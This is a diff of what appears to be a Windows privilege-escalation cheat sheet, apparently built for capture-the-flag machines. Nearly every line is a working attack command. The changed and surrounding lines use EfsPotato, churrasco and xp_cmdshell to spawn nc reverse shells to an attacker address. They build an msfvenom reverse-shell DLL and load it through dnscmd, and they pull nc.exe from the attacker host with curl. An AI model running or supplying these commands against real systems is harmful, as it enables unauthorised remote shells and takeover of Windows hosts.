@@ -1494,14 +1494,15 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
 wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 5566 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 5566\""
+forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 5566 -e cmd"
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
 
 +---------- DnsAdmins ----------+
 rlwrap nc -lvnp 5555
-impacket-smbserver share .
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
-dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
+impacket-smbserver $ /Upload/windows
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o /Upload/windows/x.dll
+dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
 +---------- Malicious .lnk ----------+
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
